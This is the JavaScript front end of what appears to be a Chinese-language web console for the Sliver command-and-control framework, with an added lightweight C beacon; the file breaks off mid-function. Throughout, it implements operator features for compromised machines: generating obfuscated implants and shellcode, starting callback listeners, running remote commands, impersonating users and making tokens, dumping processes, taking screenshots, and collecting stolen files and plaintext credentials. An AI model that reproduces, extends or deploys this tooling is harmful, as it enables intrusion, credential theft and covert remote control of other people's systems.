const pages = [
  ["dashboard", "首页"],
  ["implants", "已上线"],
  ["commands", "服务器命令"],
  ["payloads", "植入体"],
  ["listeners", "监听端口"],
  ["lite", "轻量信标"],
  ["loot", "拿走的文件"],
  ["creds", "账号密码"],
  ["hosts", "见过的机器"],
  ["websites", "托管网页"],
  ["config", "系统资料"],
  ["operators", "登录账号"],
];

const actions = [
  { id: "execute", group: "执行", label: "执行程序", fields: [
    ["path", "程序", "/bin/sh"], ["args", "参数", "-c id"],
  ]},
  { id: "ping", group: "信息", label: "Ping" },
  { id: "pwd", group: "信息", label: "当前目录" },
  { id: "ifconfig", group: "信息", label: "网卡" },
  { id: "netstat", group: "信息", label: "网络连接", fields: [
    ["tcp", "TCP", false, "check"], ["udp", "UDP", false, "check"], ["listening", "仅监听", false, "check"],
  ]},
  { id: "ps", group: "信息", label: "进程", fields: [["full", "完整信息", false, "check"]] },
  { id: "terminate", group: "信息", label: "结束进程", fields: [["pid", "PID", ""], ["force", "强制", false, "check"]] },
  { id: "procdump", group: "信息", label: "进程转储", fields: [["pid", "PID", ""]] },
  { id: "env", group: "信息", label: "环境变量", fields: [["name", "变量名，空则全部", ""]] },
  { id: "setenv", group: "信息", label: "设置变量", fields: [["name", "名称", ""], ["args", "值", ""]] },
  { id: "unsetenv", group: "信息", label: "删除变量", fields: [["name", "名称", ""]] },
  { id: "mount", group: "信息", label: "挂载" },
  { id: "services", group: "信息", label: "服务", fields: [["hostname", "主机名，可空", ""]] },
  { id: "privs", group: "信息", label: "权限" },
  { id: "token", group: "信息", label: "当前令牌" },
  { id: "screenshot", group: "信息", label: "截屏" },
  { id: "ls", group: "文件", label: "列目录", fields: [["path", "路径", "."]] },
  { id: "cd", group: "文件", label: "切换目录", fields: [["path", "路径", ""]] },
  { id: "mkdir", group: "文件", label: "新建目录", fields: [["path", "路径", ""]] },
  { id: "rm", group: "文件", label: "删除", fields: [["path", "路径", ""], ["recursive", "递归", false, "check"], ["force", "强制", false, "check"]] },
  { id: "mv", group: "文件", label: "移动", fields: [["src", "源", ""], ["dst", "目标", ""]] },
  { id: "cp", group: "文件", label: "复制", fields: [["src", "源", ""], ["dst", "目标", ""]] },
  { id: "chmod", group: "文件", label: "改权限", fields: [["path", "路径", ""], ["mode", "权限", "755"], ["recursive", "递归", false, "check"]] },
  { id: "download", group: "文件", label: "下载文件", fields: [["path", "路径", ""]] },
  { id: "grep", group: "文件", label: "搜索", fields: [["pattern", "内容", ""], ["path", "路径", "."], ["recursive", "递归", true, "check"]] },
  { id: "reg-read", group: "注册表", label: "读值", fields: [["hive", "Hive", "HKCU"], ["path", "路径", ""], ["key", "键", ""]] },
  { id: "reg-subkeys", group: "注册表", label: "子键", fields: [["hive", "Hive", "HKCU"], ["path", "路径", ""]] },
  { id: "reg-values", group: "注册表", label: "值列表", fields: [["hive", "Hive", "HKCU"], ["path", "路径", ""]] },
  { id: "runas", group: "身份", label: "RunAs", fields: [["username", "用户", ""], ["domain", "域", ""], ["password", "密码", ""], ["process", "进程", ""], ["args", "参数", ""]] },
  { id: "impersonate", group: "身份", label: "模拟用户", fields: [["username", "用户", ""]] },
  { id: "rev2self", group: "身份", label: "恢复自身" },
  { id: "make-token", group: "身份", label: "制作令牌", fields: [["username", "用户", ""], ["domain", "域", ""], ["password", "密码", ""]] },
  { id: "ssh", group: "身份", label: "SSH 命令", fields: [["hostname", "主机", ""], ["port", "端口", "22"], ["username", "用户", ""], ["password", "密码", ""], ["command", "命令", "id"]] },
  { id: "extensions", group: "管理", label: "扩展列表" },
  { id: "open-session", group: "管理", label: "让定时回来的机器改成一直连着" },
  { id: "close-session", group: "管理", label: "断开这次连接" },
  { id: "rename", group: "管理", label: "重命名", fields: [["name", "新名称", ""]] },
  { id: "reconfigure", group: "管理", label: "修改回连时间", fields: [["reconnect", "断线后多少秒再连", "60"], ["interval", "定时回来的间隔秒", ""], ["jitter", "间隔上下浮动的秒数", ""]] },
  { id: "kill", group: "管理", label: "让这台机器退出", fields: [["force", "强制", false, "check"]] },
  { id: "remove", group: "管理", label: "从列表里删掉定时回来的记录" },
];

const state = {
  token: sessionStorage.getItem("sliver-web-token") || "",
  page: "dashboard",
  sessions: [],
  beacons: [],
  selected: null,
  tab: "command",
  cwd: ".",
  action: "execute",
};

const $ = (id) => document.getElementById(id);

function esc(value) {
  return String(value ?? "").replace(/[&<>"']/g, (ch) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
  }[ch]));
}

function when(unix) {
  if (!unix) return "—";
  return new Date(unix * 1000).toLocaleString();
}

function bytesOf(b64) {
  if (!b64) return new Uint8Array();
  const raw = atob(b64);
  const out = new Uint8Array(raw.length);
  for (let i = 0; i < raw.length; i++) out[i] = raw.charCodeAt(i);
  return out;
}

function textOf(b64) {
  if (!b64) return "";
  try { return new TextDecoder().decode(bytesOf(b64)); } catch { return ""; }
}

async function api(path, options = {}) {
  const headers = { Authorization: "Bearer " + state.token };
  let body = options.body;
  if (options.json !== undefined) {
    headers["Content-Type"] = "application/json";
    body = JSON.stringify(options.json);
  }
  const res = await fetch(path, { method: options.method || "GET", headers, body });
  const type = res.headers.get("content-type") || "";
  if (type.includes("application/json")) {
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || res.statusText);
    return data;
  }
  if (!res.ok) throw new Error((await res.text()) || res.statusText);
  return res;
}

function downloadBlob(blob, name) {
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = name || "implant";
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 1500);
}

function pill(dead) {
  return `<span class="pill ${dead ? "dead" : ""}"><i></i>${dead ? "离线" : "在线"}</span>`;
}

function table(headers, rows) {
  return `<div class="table-wrap"><table><thead><tr>${headers.map((h) => `<th>${esc(h)}</th>`).join("")}</tr></thead><tbody>${rows.join("") || `<tr><td colspan="${headers.length}">没有数据</td></tr>`}</tbody></table></div>`;
}

async function boot() {
  $("nav").innerHTML = pages.map(([id, label]) => `<button data-page="${id}">${label}</button>`).join("");
  $("nav").onclick = (event) => {
    const button = event.target.closest("button");
    if (!button) return;
    state.page = button.dataset.page;
    state.selected = null;
    render();
  };
  $("refresh").onclick = () => render();
  $("logout").onclick = () => {
    sessionStorage.removeItem("sliver-web-token");
    state.token = "";
    showLogin();
  };
  $("login-form").onsubmit = async (event) => {
    event.preventDefault();
    const username = $("username").value.trim();
    const password = $("password").value;
    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "登录失败");
      state.token = data.token;
      sessionStorage.setItem("sliver-web-token", data.token);
      $("login-error").textContent = "";
      showApp();
    } catch (err) {
      $("login-error").textContent = err.message;
    }
  };
  if (!state.token) return showLogin();
  try {
    await api("/api/version");
    showApp();
  } catch {
    showLogin();
  }
}

function showLogin() {
  $("login").classList.remove("hidden");
  $("shell").classList.add("hidden");
  clearInterval(state.timer);
}

function showApp() {
  $("login").classList.add("hidden");
  $("shell").classList.remove("hidden");
  render();
  clearInterval(state.timer);
  state.timer = setInterval(() => {
    if (state.page === "dashboard" || state.page === "implants") refreshImplants(false);
  }, 5000);
}

async function render() {
  document.querySelectorAll("#nav button").forEach((button) => {
    button.classList.toggle("active", button.dataset.page === state.page);
  });
  const meta = pages.find((item) => item[0] === state.page);
  $("title").textContent = state.selected ? state.selected.Name || state.selected.ID : meta[1];
  $("subtitle").textContent = state.selected ? `${kindLabel(state.selected.kind)} · ${state.selected.Hostname || ""}` : "这个页面只在你自己的电脑上打开";
  $("clock").textContent = new Date().toLocaleTimeString();
  const view = $("view");
  view.innerHTML = `<p class="hint">加载中…</p>`;
  try {
    if (state.page === "dashboard") await renderDashboard(view);
    else if (state.page === "implants") await renderImplants(view);
    else if (state.page === "commands") renderCommandBrowser(view, "server", null);
    else if (state.page === "payloads") await renderPayloads(view);
    else if (state.page === "listeners") await renderListeners(view);
    else if (state.page === "lite") await renderLite(view);
    else if (state.page === "loot") await renderLoot(view);
    else if (state.page === "creds") await renderCreds(view);
    else if (state.page === "hosts") await renderHosts(view);
    else if (state.page === "websites") await renderWebsites(view);
    else if (state.page === "config") await renderConfig(view);
    else if (state.page === "operators") await renderOperators(view);
  } catch (err) {
    view.innerHTML = `<p class="error">${esc(err.message)}</p>`;
  }
}

async function refreshImplants(redraw) {
  const [sessions, beacons] = await Promise.all([api("/api/sessions"), api("/api/beacons")]);
  state.sessions = sessions.Sessions || [];
  state.beacons = beacons.Beacons || [];
  if (state.selected) {
    const pool = state.selected.kind === "beacon" ? state.beacons : state.sessions;
    const fresh = pool.find((item) => item.ID === state.selected.ID);
    if (fresh) state.selected = Object.assign(fresh, { kind: state.selected.kind });
  }
  if (redraw) render();
}

async function renderDashboard(view) {
  const data = await api("/api/overview");
  view.innerHTML = `
    <div class="cards">
      ${card("一直连着", data.sessionsAlive, `共 ${data.sessions} 台`)}
      ${card("定时回来", data.beaconsAlive, `共 ${data.beacons} 台`)}
      ${card("监听端口", data.jobs, "正在等机器连上来")}
      ${card("当前时间", new Date(data.time * 1000).toLocaleTimeString(), "已上线列表每 5 秒刷新")}
    </div>
    <section class="panel"><h3>从这里开始</h3>
      <p class="hint">「已上线」是已经连回来的机器。「植入体」是编译出来、还没运行的文件。「监听端口」是这些机器要连的地址。「服务器命令」可以操作这个控制台本身。点进一台已上线的机器后，可以下命令、看文件，远程命令行在「终端」页。</p>
    </section>`;
}

function card(label, value, note) {
  return `<article class="card"><span>${esc(label)}</span><b>${esc(value)}</b><span>${esc(note)}</span></article>`;
}

async function renderImplants(view) {
  if (state.selected) return renderInteract(view);
  await refreshImplants(false);
  const rows = [];
  for (const item of state.sessions) rows.push(implantRow(item, "session"));
  for (const item of state.beacons) rows.push(implantRow(item, "beacon"));
  view.innerHTML = table(["状态", "怎么连", "名称", "机器名", "用户", "连接方式", "地址", "进程", "最近联系"], rows);
  view.querySelectorAll("tr.clickable").forEach((row) => {
    row.onclick = () => {
      const kind = row.dataset.kind;
      const pool = kind === "beacon" ? state.beacons : state.sessions;
      state.selected = Object.assign({}, pool.find((item) => item.ID === row.dataset.id), { kind });
      state.cwd = ".";
      render();
    };
  });
}

function kindLabel(kind) {
  return kind === "beacon" ? "定时回来" : "一直连着";
}

function implantRow(item, kind) {
  return `<tr class="clickable" data-kind="${kind}" data-id="${esc(item.ID)}">
    <td>${pill(item.IsDead)}</td><td>${kindLabel(kind)}</td><td>${esc(item.Name)}</td><td>${esc(item.Hostname)}</td>
    <td>${esc(item.Username)}</td><td>${esc(item.Transport)}</td><td>${esc(item.RemoteAddress)}</td>
    <td>${esc(item.Filename)} (${esc(item.PID)})</td><td>${when(item.LastCheckin)}</td></tr>`;
}

async function renderInteract(view) {
  const item = state.selected;
  view.innerHTML = `
    <div class="row" style="margin-bottom:12px">
      <button class="ghost" id="back">返回列表</button>
      <span class="hint">${esc(item.Username)}@${esc(item.Hostname)} · ${esc(item.OS)}/${esc(item.Arch)} · ${esc(item.ActiveC2 || item.Transport)} · PID ${esc(item.PID)}</span>
      ${pill(item.IsDead)}
    </div>
    <div class="tabs" id="tabs">
      <button data-tab="command" class="${state.tab === "command" ? "active" : ""}">全部命令</button>
      <button data-tab="terminal" class="${state.tab === "terminal" ? "active" : ""}">终端</button>
      <button data-tab="files" class="${state.tab === "files" ? "active" : ""}">文件</button>
      <button data-tab="tasks" class="${state.tab === "tasks" ? "active" : ""}">任务</button>
    </div>
    <div id="interact"></div>`;
  $("back").onclick = () => { state.selected = null; render(); };
  view.querySelectorAll("#tabs button").forEach((button) => {
    button.onclick = () => { state.tab = button.dataset.tab; render(); };
  });
  const box = view.querySelector("#interact");
  if (state.tab === "files") return renderFiles(box);
  if (state.tab === "tasks") return renderTasks(box);
  if (state.tab === "terminal") return renderTerminal(box);
  return renderCommandBrowser(box, "implant", item);
}

function renderResult(action, result) {
  if (result && result.ok) return "完成。";
  const response = result.Response || {};
  if (response.Async) return `任务已下发。\n任务 ID：${response.TaskID || ""}`;
  if (action === "execute" || action === "ssh") {
    return [textOf(result.Stdout), textOf(result.Stderr), result.StdOut, result.StdErr].filter(Boolean).join("\n") || "没有输出";
  }
  if (action === "screenshot" && result.Data) {
    const blob = new Blob([bytesOf(result.Data)]);
    const url = URL.createObjectURL(blob);
    return `<img class="shot" alt="截屏" src="${url}">`;
  }
  if ((action === "download" || action === "procdump") && result.Data) {
    const blob = new Blob([bytesOf(result.Data)]);
    const name = result.Path ? result.Path.split("/").pop() : action + ".bin";
    setTimeout(() => downloadBlob(blob, name), 0);
    return `已开始下载 ${name}（${bytesOf(result.Data).length} 字节）`;
  }
  if (action === "ls" && result.Files) {
    return result.Files.map((file) => `${file.Mode || ""} ${file.IsDir ? "d" : "-"} ${file.Size}\t${file.Name}`).join("\n") || "空目录";
  }
  if (action === "ps" && result.Processes) {
    return result.Processes.map((proc) => `${proc.Pid}\t${proc.Owner || ""}\t${proc.Executable || ""}`).join("\n");
  }
  return JSON.stringify(result, null, 2);
}

async function renderFiles(box) {
  box.innerHTML = `<div class="panel">
    <form id="ls-form" class="row"><label>路径<input id="file-path" value="${esc(state.cwd)}"></label><button type="submit">打开</button></form>
    <form id="up-form" class="row"><label>上传到<input id="up-path" placeholder="/tmp/file"></label><input id="up-file" type="file"><button type="submit">上传</button></form>
    <div id="file-list"></div><p id="file-note" class="hint"></p></div>`;
  const load = async (path) => {
    state.cwd = path || ".";
    $("file-path").value = state.cwd;
    $("file-note").textContent = "读取中…";
    try {
      const result = await api("/api/task", { method: "POST", json: { kind: state.selected.kind, id: state.selected.ID, action: "ls", path: state.cwd } });
      if (result.Response && result.Response.Async) {
        $("file-list").innerHTML = "";
        $("file-note").textContent = "这台机器是定时回来的，目录列表要等它下次连上，再到「任务」页看结果。";
        return;
      }
      const files = result.Files || [];
      $("file-list").innerHTML = table(["名称", "大小", "权限", "修改时间"], files.map((file) => `<tr class="files"><td data-name="${esc(file.Name)}" data-dir="${file.IsDir}">${esc(file.Name)}${file.IsDir ? "/" : ""}</td><td>${esc(file.Size)}</td><td>${esc(file.Mode)}</td><td>${when(file.ModTime)}</td></tr>`));
      $("file-note").textContent = result.Path || "";
      $("file-list").querySelectorAll("td[data-name]").forEach((cell) => {
        cell.onclick = () => {
          const next = joinPath(state.cwd, cell.dataset.name);
          if (cell.dataset.dir === "true") load(next);
          else taskDownload(next);
        };
      });
    } catch (err) {
      $("file-note").textContent = err.message;
    }
  };
  $("ls-form").onsubmit = (event) => { event.preventDefault(); load($("file-path").value); };
  $("up-form").onsubmit = async (event) => {
    event.preventDefault();
    const data = new FormData();
    data.set("kind", state.selected.kind);
    data.set("id", state.selected.ID);
    data.set("path", $("up-path").value);
    data.set("file", $("up-file").files[0]);
    const res = await fetch("/api/upload", { method: "POST", headers: { Authorization: "Bearer " + state.token }, body: data });
    const type = res.headers.get("content-type") || "";
    const payload = type.includes("json") ? await res.json() : null;
    $("file-note").textContent = res.ok ? "上传完成" : (payload && payload.error) || "上传失败";
    if (res.ok) load(state.cwd);
  };
  load(state.cwd);
}

function joinPath(dir, name) {
  if (!dir || dir === ".") return name;
  return dir.replace(/\/$/, "") + "/" + name;
}

async function taskDownload(path) {
  const result = await api("/api/task", { method: "POST", json: { kind: state.selected.kind, id: state.selected.ID, action: "download", path } });
  if (result.Response && result.Response.Async) {
    $("file-note").textContent = "这台机器是定时回来的，下载要等它下次连上。";
    return;
  }
  downloadBlob(new Blob([bytesOf(result.Data)]), path.split("/").pop());
}

async function renderTasks(box) {
  if (state.selected.kind !== "beacon") {
    box.innerHTML = `<p class="hint">一直连着的机器会马上返回结果。定时回来的机器才会把命令排进队列。</p>`;
    return;
  }
  const data = await api("/api/beacons/tasks?id=" + encodeURIComponent(state.selected.ID));
  const tasks = data.Tasks || [];
  box.innerHTML = table(["状态", "描述", "创建", "完成", "ID"], tasks.map((task) => `<tr><td>${esc(task.State)}</td><td>${esc(task.Description)}</td><td>${when(task.CreatedAt)}</td><td>${when(task.CompletedAt)}</td><td class="mono">${esc(task.ID)}</td></tr>`));
}

async function renderPayloads(view) {
  const builds = await api("/api/implants/builds");
  const configs = builds.Configs || {};
  const rows = Object.keys(configs).map((name) => {
    const cfg = configs[name];
    const c2 = (cfg.C2 || []).map((item) => item.URL).join(", ");
    return `<tr><td>${esc(name)}</td><td>${cfg.IsBeacon ? "定时回来" : "一直连着"}</td><td>${esc(cfg.GOOS)}/${esc(cfg.GOARCH)}</td><td>${esc(c2)}</td><td><button class="small" data-rebuild="${esc(name)}">下载</button> <button class="small danger" data-del="${esc(name)}">删除</button></td></tr>`;
  });
  view.innerHTML = `
    <form id="gen" class="panel"><h3>生成植入体</h3>
      <div class="row">
        <label>名称<input name="name" placeholder="留空会自动起名"></label>
        <label>系统<select name="os"><option>linux</option><option>windows</option><option>darwin</option></select></label>
        <label>芯片<select name="arch"><option>amd64</option><option>arm64</option><option>386</option></select></label>
      </div>
      <div class="row">
        <label>连回这个地址<input name="c2" value="mtls://127.0.0.1:8888" required></label>
        <label>文件类型<select name="format"><option value="EXECUTABLE">可执行文件</option><option value="SHARED_LIB">动态库</option><option value="SHELLCODE">可注入的机器码</option><option value="SERVICE">系统服务</option></select></label>
      </div>
      <div class="row">
        <label><input name="beacon" type="checkbox"> 定时回来，而不是一直连着</label>
        <label>隔多少秒回来一次<input name="interval" value="60"></label>
        <label>时间上下浮动秒数<input name="jitter" value="30"></label>
        <label><input name="obfuscate" type="checkbox"> 打乱函数名</label>
      </div>
      <button type="submit">生成并下载</button>
      <p id="gen-note" class="hint">同名会直接覆盖上一份。打乱函数名会更慢，也更占内存。</p>
    </form>
    <section class="panel"><h3>已经生成过的植入体</h3>
      <p id="builds-note" class="hint">点「下载」会把文件存进浏览器的下载目录。点「删除」会从这台电脑上删掉这份文件和记录。</p>
      ${table(["名称", "上线方式", "要跑在哪", "回连地址", "操作"], rows)}</section>`;
  $("gen").onsubmit = async (event) => {
    event.preventDefault();
    const form = new FormData(event.target);
    const note = $("gen-note");
    note.textContent = "正在编译，可能需要几分钟…";
    try {
      const res = await api("/api/implants/generate", { method: "POST", json: {
        name: form.get("name"), os: form.get("os"), arch: form.get("arch"), c2: form.get("c2"),
        format: form.get("format"), beacon: form.get("beacon") === "on",
        interval: Number(form.get("interval") || 60), jitter: Number(form.get("jitter") || 0),
        obfuscate: form.get("obfuscate") === "on",
      }});
      const blob = await res.blob();
      const name = res.headers.get("X-Implant-Name") || "implant";
      downloadBlob(blob, name);
      note.textContent = "已下载 " + name;
      render();
    } catch (err) {
      note.textContent = err.message;
    }
  };
  view.querySelectorAll("[data-rebuild]").forEach((button) => button.onclick = async () => {
    const note = $("builds-note");
    note.textContent = "正在下载…";
    try {
      await rebuild(button.dataset.rebuild);
      note.textContent = "已保存到浏览器的下载目录";
    } catch (err) {
      note.textContent = err.message;
    }
  });
  view.querySelectorAll("[data-del]").forEach((button) => button.onclick = async () => {
    const note = $("builds-note");
    try {
      await removeBuild(button.dataset.del);
    } catch (err) {
      note.textContent = err.message;
    }
  });
}

async function rebuild(name) {
  const res = await api("/api/implants/regenerate", { method: "POST", json: { name } });
  downloadBlob(await res.blob(), res.headers.get("X-Implant-Name") || name);
}

async function removeBuild(name) {
  await api("/api/implants/builds/delete", { method: "POST", json: { name } });
  render();
}

async function renderListeners(view) {
  const jobs = await api("/api/jobs");
  const rows = (jobs.Active || []).map((job) => `<tr><td>${esc(job.ID)}</td><td>${esc(job.Name)}</td><td>${esc(job.Protocol)}</td><td>${esc(job.Port)}</td><td>${esc(job.Description)}</td><td><button class="small danger" data-job="${esc(job.ID)}">停止</button></td></tr>`);
  view.innerHTML = `
    <form id="listen" class="panel"><h3>打开一个监听端口</h3>
      <div class="row">
        <label>协议<select name="proto"><option value="mtls">mTLS</option><option value="http">HTTP</option><option value="https">HTTPS</option><option value="dns">DNS</option></select></label>
        <label>监听地址<input name="host" value="127.0.0.1"></label>
        <label>端口<input name="port" value="8888"></label>
        <label>域名<input name="domain" placeholder="网页用的域名，或域名监听的上级域名"></label>
      </div>
      <button type="submit">启动</button><p id="listen-note" class="hint"></p>
    </form>
    <section class="panel"><h3>正在运行</h3>${table(["ID", "名称", "协议", "端口", "说明", ""], rows)}</section>`;
  $("listen").onsubmit = async (event) => {
    event.preventDefault();
    const form = new FormData(event.target);
    try {
      await api("/api/listeners/" + form.get("proto"), { method: "POST", json: { host: form.get("host"), port: Number(form.get("port")), domain: form.get("domain") } });
      render();
    } catch (err) {
      $("listen-note").textContent = err.message;
    }
  };
  view.querySelectorAll("[data-job]").forEach((button) => button.onclick = async () => {
    await api("/api/jobs/kill", { method: "POST", json: { id: Number(button.dataset.job) } });
    render();
  });
}

async function renderLoot(view) {
  const data = await api("/api/loot");
  const rows = (data.Loot || []).map((item) => `<tr><td>${esc(item.Name)}</td><td>${esc(item.FileType)}</td><td>${esc(item.Size)}</td><td>${esc(item.OriginHostUUID)}</td><td><a href="/api/loot/content?id=${encodeURIComponent(item.ID)}&token=${encodeURIComponent(state.token)}">下载</a> <button class="small danger" data-id="${esc(item.ID)}">删除</button></td></tr>`);
  view.innerHTML = `<section class="panel"><h3>已经拿走的文件</h3>${table(["名称", "类型", "大小", "来自哪台机器", ""], rows)}</section>`;
  view.querySelectorAll("[data-id]").forEach((button) => button.onclick = async () => {
    await api("/api/loot/delete", { method: "POST", json: { id: button.dataset.id } });
    render();
  });
}

async function renderCreds(view) {
  const data = await api("/api/creds");
  const rows = (data.Credentials || []).map((item) => `<tr><td>${esc(item.Username)}</td><td>${esc(item.Plaintext)}</td><td class="mono">${esc(item.Hash)}</td><td>${esc(item.Collection)}</td><td><button class="small danger" data-id="${esc(item.ID)}">删除</button></td></tr>`);
  view.innerHTML = `
    <form id="cred" class="panel"><h3>记下一个账号</h3><div class="row">
      <label>用户名<input name="username"></label><label>密码原文<input name="plaintext"></label>
      <label>密码哈希<input name="hash"></label><label>分组<input name="collection" value="manual"></label>
    </div><button type="submit">保存</button></form>
    <section class="panel"><h3>保存过的账号</h3>${table(["用户名", "密码原文", "密码哈希", "分组", ""], rows)}</section>`;
  $("cred").onsubmit = async (event) => {
    event.preventDefault();
    const form = new FormData(event.target);
    await api("/api/creds/add", { method: "POST", json: Object.fromEntries(form.entries()) });
    render();
  };
  view.querySelectorAll("[data-id]").forEach((button) => button.onclick = async () => {
    await api("/api/creds/delete", { method: "POST", json: { id: button.dataset.id } });
    render();
  });
}

async function renderHosts(view) {
  const data = await api("/api/hosts");
  const rows = (data.Hosts || []).map((item) => `<tr><td>${esc(item.Hostname)}</td><td>${esc(item.OSVersion)}</td><td class="mono">${esc(item.HostUUID)}</td><td><button class="small danger" data-id="${esc(item.HostUUID)}">删除</button></td></tr>`);
  view.innerHTML = `<section class="panel"><h3>见过的机器</h3>${table(["机器名", "系统", "唯一编号", ""], rows)}</section>`;
  view.querySelectorAll("[data-id]").forEach((button) => button.onclick = async () => {
    await api("/api/hosts/delete", { method: "POST", json: { hostUUID: button.dataset.id } });
    render();
  });
}

async function renderWebsites(view) {
  const data = await api("/api/websites");
  const rows = (data.Websites || []).map((site) => {
    const paths = Object.keys(site.Contents || {});
    return `<tr><td>${esc(site.Name)}</td><td>${paths.length}</td><td class="mono">${esc(paths.join(", "))}</td><td><button class="small danger" data-name="${esc(site.Name)}">删除</button></td></tr>`;
  });
  view.innerHTML = `<section class="panel"><h3>正在托管的网页</h3>${table(["名称", "文件数", "路径", ""], rows)}</section>`;
  view.querySelectorAll("[data-name]").forEach((button) => button.onclick = async () => {
    await api("/api/websites/delete", { method: "POST", json: { name: button.dataset.name } });
    render();
  });
}

async function renderConfig(view) {
  const [profiles, canaries, builders, compiler, pivots, certs] = await Promise.all([
    api("/api/c2profiles"), api("/api/canaries"), api("/api/builders"), api("/api/compiler"), api("/api/pivots"), api("/api/certificates"),
  ]);
  const profileRows = (profiles.configs || profiles.Configs || []).map((item) => `<tr><td>${esc(item.Name)}</td></tr>`);
  const canaryRows = (canaries.Canaries || []).map((item) => `<tr><td>${esc(item.ImplantName)}</td><td>${esc(item.Domain)}</td><td>${item.Triggered ? "已触发" : "未触发"}</td><td>${esc(item.Count)}</td></tr>`);
  const builderRows = (builders.Builders || []).map((item) => `<tr><td>${esc(item.Name)}</td><td>${esc(item.OperatorName)}</td><td>${esc(item.GOOS)}/${esc(item.GOARCH)}</td></tr>`);
  view.innerHTML = `
    <section class="panel"><h3>网页回连用的配置</h3>${table(["名称"], profileRows)}</section>
    <section class="panel"><h3>有人访问这些域名时告警</h3>${table(["程序名", "域名", "状态", "次数"], canaryRows)}</section>
    <section class="panel"><h3>外部编译机器</h3>${table(["名称", "谁在用", "系统"], builderRows)}</section>
    <section class="panel"><h3>这台电脑能编译哪些系统</h3><pre class="output">${esc(JSON.stringify({ GOOS: compiler.GOOS, GOARCH: compiler.GOARCH, Targets: compiler.Targets }, null, 2))}</pre></section>
    <section class="panel"><h3>机器之间的跳板关系</h3><pre class="output">${esc(JSON.stringify(pivots, null, 2))}</pre></section>
    <section class="panel"><h3>证书</h3><pre class="output">${esc(JSON.stringify(certs, null, 2))}</pre></section>`;
}

async function renderOperators(view) {
  const data = await api("/api/operators");
  const rows = (data.Operators || []).map((item) => `<tr><td>${esc(item.Name)}</td><td>${item.Online ? "在线" : "离线"}</td></tr>`);
  view.innerHTML = `<section class="panel"><h3>可以登录的账号</h3>${table(["名称", "状态"], rows)}</section>`;
}

async function renderLite(view) {
  const [cfg, beacons] = await Promise.all([api("/api/lite/config"), api("/api/lite/beacons")]);
  const rows = (beacons.Beacons || []).map((b) => {
    const info = b.Info || {};
    return `<tr><td class="mono">${esc(b.ID)}</td><td>${esc(info.Hostname || "")}</td><td>${esc(info.OS || "")}/${esc(info.Arch || "")}</td>
      <td>${esc(info.Username || "")}</td><td>${whenISO(b.FirstSeen)}</td><td>${whenISO(b.LastSeen)}</td>
      <td><button class="small danger" data-del="${esc(b.ID)}">删除</button></td></tr>`;
  });
  view.innerHTML = `
    <form id="lite-listen" class="panel"><h3>轻量信标监听</h3>
      <p class="hint">C 植入体连这个独立端口，走轻量协议，和 Sliver 监听互不相干。${cfg.running ? "正在监听：" + esc(cfg.addr) : "当前没在监听。"}</p>
      <div class="row">
        <label>监听地址<input name="host" value="0.0.0.0"></label>
        <label>端口<input name="port" value="8443"></label>
        <label>路径<input name="path" value="/api/v2/sync"></label>
        <label>目标看到的地址<input name="url" placeholder="https://c2.example.com:8443"></label>
      </div>
      <button type="submit">${cfg.running ? "重启监听" : "启动监听"}</button>
      ${cfg.running ? '<button type="button" class="danger" id="lite-stop">停止</button>' : ""}
      <p id="lite-note" class="hint"></p>
    </form>
    <section class="panel"><h3>构建配置</h3>
      <p class="hint">把 config.h 存到 implant/lite/ 目录里，然后跑 ./build.sh linux 或 ./build.sh windows。当前密钥：${esc((cfg.secretB64 || "").slice(0, 12))}…（签发新密钥后，已部署的旧信标仍然有效）</p>
      <button type="button" id="lite-cfg-dl">下载 config.h</button>
      <button type="button" id="lite-cfg-new">签发新密钥</button>
      <p id="lite-cfg-note" class="hint"></p>
    </section>
    <section class="panel"><h3>已上线的轻量信标</h3>${table(["ID", "机器名", "系统", "用户", "首次", "最近", ""], rows)}</section>
    <form id="lite-task" class="panel"><h3>下发任务</h3>
      <div class="row">
        <label>信标 ID<input name="beaconId" placeholder="从上表复制"></label>
        <label>类型<select name="type">
          <option value="exec">执行命令</option><option value="read">读文件</option>
          <option value="sleep">改回连间隔</option><option value="exit">让它退出</option>
        </select></label>
        <label>命令<input name="cmd" placeholder="id"></label>
        <label>文件路径<input name="path" placeholder="/etc/hostname"></label>
        <label>超时秒<input name="timeout" value="30"></label>
        <label>新间隔秒<input name="interval" value="180"></label>
      </div>
      <button type="submit">排进队列</button>
      <p id="lite-task-note" class="hint"></p>
    </form>
    <form id="lite-res" class="panel"><h3>拉取结果</h3>
      <div class="row"><label>信标 ID<input name="beaconId"></label><button type="submit">拉取</button></div>
      <pre id="lite-results" class="output">结果会显示在这里。</pre>
    </form>`;
  $("lite-listen").onsubmit = async (event) => {
    event.preventDefault();
    const form = new FormData(event.target);
    try {
      if (cfg.running) await api("/api/lite/listener/stop", { method: "POST", json: {} });
      const res = await api("/api/lite/listener/start", { method: "POST", json: {
        host: form.get("host"), port: Number(form.get("port")), path: form.get("path"), url: form.get("url"),
      }});
      $("lite-note").textContent = "已监听 " + res.addr;
      setTimeout(render, 400);
    } catch (err) { $("lite-note").textContent = err.message; }
  };
  const stopBtn = $("lite-stop");
  if (stopBtn) stopBtn.onclick = async () => {
    try { await api("/api/lite/listener/stop", { method: "POST", json: {} }); } catch (err) { $("lite-note").textContent = err.message; }
    render();
  };
  $("lite-cfg-dl").onclick = () => downloadBlob(new Blob([cfg.configH]), "config.h");
  $("lite-cfg-new").onclick = async () => {
    try {
      const fresh = await api("/api/lite/config", { method: "POST", json: {} });
      downloadBlob(new Blob([fresh.configH]), "config.h");
      $("lite-cfg-note").textContent = "已签发新密钥，config.h 已下载";
    } catch (err) { $("lite-cfg-note").textContent = err.message; }
  };
  $("lite-task").onsubmit = async (event) => {
    event.preventDefault();
    const form = new FormData(event.target);
    try {
      const res = await api("/api/lite/task", { method: "POST", json: {
        beaconId: form.get("beaconId"), type: form.get("type"), cmd: form.get("cmd"),
        path: form.get("path"), timeout: Number(form.get("timeout") || 30), interval: Number(form.get("interval") || 180),
      }});
      $("lite-task-note").textContent = "已排队，任务 ID " + res.taskId + "，等它下次回连时下发";
    } catch (err) { $("lite-task-note").textContent = err.message; }
  };
  $("lite-res").onsubmit = async (event) => {
